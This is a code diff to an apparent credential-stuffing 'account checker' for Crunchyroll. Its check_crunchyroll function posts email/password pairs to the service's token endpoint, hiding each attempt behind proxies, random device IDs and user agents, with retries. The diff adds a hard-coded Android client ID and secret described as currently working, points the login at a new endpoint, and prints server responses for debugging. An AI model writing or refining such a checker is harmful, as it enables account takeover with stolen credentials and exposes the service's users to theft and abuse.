@@ -6,6 +6,7 @@ import time
 import string
 import random
 import uuid
+import base64
 import requests
 import re
 import random
@@ -1332,13 +1333,19 @@ def check_crunchyroll(email, password, proxy=None):
     proxies = {'http': proxy, 'https': proxy} if proxy else None
     max_retries = 4
 
+    # === CURRENT WORKING ANDROID CLIENT (2026) ===
+    CLIENT_ID = "dmryfescdbotubenz5z"
+    CLIENT_SECRET = "5N9i8OWg2VkMrmhzC_5CWzDK8nyIz4AM"
+    basic_auth = base64.b64encode(f"{CLIENT_ID}:{CLIENT_SECRET}".encode()).decode()
+
     for attempt in range(max_retries):
         try:
             device_id, _, _ = generate_random_device_info()
             user_agent = generate_random_user_agent()
 
             # ====================== LOGIN ======================
-            token_url = "https://beta-api.crunchyroll.com/auth/v1/token"
+            # token_url = "https://beta-api.crunchyroll.com/auth/v1/token"
+            token_url = "https://www.crunchyroll.com/auth/v1/token"
             
             token_data = {
                 "grant_type": "password",
@@ -1361,7 +1368,11 @@ def check_crunchyroll(email, password, proxy=None):
                 "accept-encoding": "gzip"
             }
 
+            print(f"[DEBUG] Login Attempt {attempt+1} | Status: ", end="")
+
             resp = requests.post(token_url, data=token_data, headers=headers, proxies=proxies, timeout=25)
+
+            print(f"{resp.status_code} | Body: {resp.text[:350]}")
 
             if resp.status_code == 200:
                 access_token = resp.json().get('access_token')
